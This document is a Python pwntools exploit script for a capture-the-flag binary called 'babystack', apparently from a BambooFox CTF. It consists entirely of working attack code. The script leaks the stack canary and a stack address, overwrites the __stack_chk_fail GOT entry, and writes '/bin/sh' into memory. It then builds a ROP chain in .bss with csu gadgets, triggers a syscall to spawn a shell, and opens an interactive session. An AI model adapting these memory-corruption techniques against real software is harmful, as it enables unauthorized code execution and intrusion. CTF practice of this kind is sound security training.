#!/usr/bin/python3

from pwn import *
import sys

HOST = 'chall.ctf.bamboofox.tw'
PORT = 10102
BIN = './babystack'
e = ELF(BIN)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN)

main_addr = 0x401379
first_read = 0x40134C
leave_ret = 0x401235
ret = 0x401016
##### round 1
r.sendafter('Name: ', 'A')
r.sendafter(' your token: ', 'deadbeef')
r.sendafter('str1: ', b'\x00' + b'A'*0x7)
r.sendafter('str2: ', b'A')

r.recvuntil('A'*1)
canary = u64(b'\x00' + r.recv(7))
log.info(f"canary: {hex(canary)}")

stack = u64(r.recv(6) + b'\x00'*2)
log.info(f"stack: {hex(stack)}")

r.sendafter('str1: ', b'\x00' + b'A'*0xf)
r.sendafter('str2: ', b'A'*0x28 + p64(canary) + p64(e.got['__stack_chk_fail'] + 0x50))
r.send(p64(main_addr))
binsh = 0x4034f0

syscall = 0x401437

##### round 2 => write binsh
# stack - 0x90
sleep(0.1)
r.send('A')
sleep(0.1)
r.send('deadbeef')
sleep(0.1)
r.send('A')
sleep(0.1)
r.send('A')
sleep(0.1)
r.send(b'\x00' + b'A'*0xf)
sleep(0.1)
r.send(b'A'*0x28 + p64(canary) + p64(binsh + 0x50))
sleep(0.1)
r.send(b"/bin/sh\x00")

bss = 0x403b00
def write_ROP_gadget(ROP, offset):
    sleep(0.1)
    r.send('A') # name
    sleep(0.1)
    r.send('deadbeef') # token 

    ## 1
    sleep(0.1)
    r.send('A')
    sleep(0.1)
    r.send('A')

    ## 2
    sleep(0.1)
    r.send(p64(0)*2)
    sleep(0.1)
    r.send(b'b'*0x28 + p64(canary) + p64(bss + offset + 0x50))
    
    sleep(0.1)
    r.send(ROP)

magic = 0x4010f8
csu = 0x4014B2
# from pop rbx
write_ROP_gadget(p64(csu) + p64(1)*2, 0)
write_ROP_gadget(p64(1)*3, 0x18)
write_ROP_gadget(p64(1) + p64(magic) + p64(0x7b), 0x30)
write_ROP_gadget(p64(0x4014B2) + p64(0) + p64(0), 0x48)
write_ROP_gadget(p64(bss + 0x88) + p64(binsh) + p64(0), 0x60)
write_ROP_gadget(p64(0) + p64(0x401498) + p64(syscall), 0x78)
write_ROP_gadget(p64(canary) + p64(bss-0x8) + p64(ret), -0x18)
write_ROP_gadget(b'A', -0x60)

log.info(f"rop: {hex(bss)}")
r.interactive()
